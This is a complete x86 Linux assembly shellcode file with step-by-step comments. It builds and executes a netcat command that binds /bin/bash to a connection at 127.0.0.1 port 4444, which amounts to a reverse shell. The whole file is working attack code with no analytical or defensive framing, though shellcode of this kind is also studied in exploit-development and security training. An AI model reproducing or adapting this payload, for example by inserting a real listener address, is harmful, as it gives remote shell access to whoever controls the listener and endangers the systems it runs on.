;Shellcode execve(/usr/bin/nc, [/usr/bin/nc -e /bin/bash 127.0.0.1 4444], NULL)

[SECTION .text]

global _start

_start:
 
    xor eax, eax        ; clear EAX

    ; execve first parameter in EBX : ptr to /usr/bin//nc

    push eax            ; NULL byte
    push dword '//nc'   ; /usr/bin//nc
    push dword '/bin'
    push dword '/usr'
    mov ebx, esp        ; ptr to /usr/bin//nc

    ; arguments preparation

    push eax            ; NULL byte
    push word '-e'      ; -e
    mov ecx, esp        ; ptr to -e

    push eax            ; NULL byte
    push dword 'bash'   ; ////bin/bash
    push dword 'bin/'
    push dword '////'
    mov edx, esp        ; ptr to ////bin/bash

    push eax            ; NULL byte
    push dword '.0.1'   ; 127.0000.0.1
    push dword '0000'
    push dword '127.'
    mov edi, esp        ; ptr to 127.0000.0.1

    push eax            ; NULL byte
    push 0x34343434     ; 4444
    mov esi, esp        ; ptr to 4444

    ; execve second parameter, list of arguments in ECX
    ; /usr/bin/nc -e /bin/bash 127.0.0.1 4444

    push eax            ; NULL byte
    push esi            ; 4444
    push edi            ; 127.0.0.1
    push edx            ; /bin/bash
    push ecx            ; -e
    push ebx            ; /usr/bin/nc
    mov ecx, esp        ; ptr to ECX

    ; execve third parameter, NULL in EDX

    xor edx, edx        ; clear EDX

    ; execve syscall

    mov al, 0xb         ; execve syscall
    int 0x80            ; Syscall

    ; exit syscall
  
    xor eax, eax        ; clear EAX
    mov al, 1           ; Syscall 1 exit
    xor ebx, ebx        ; clear EBX
    int 0x80            ; Syscall
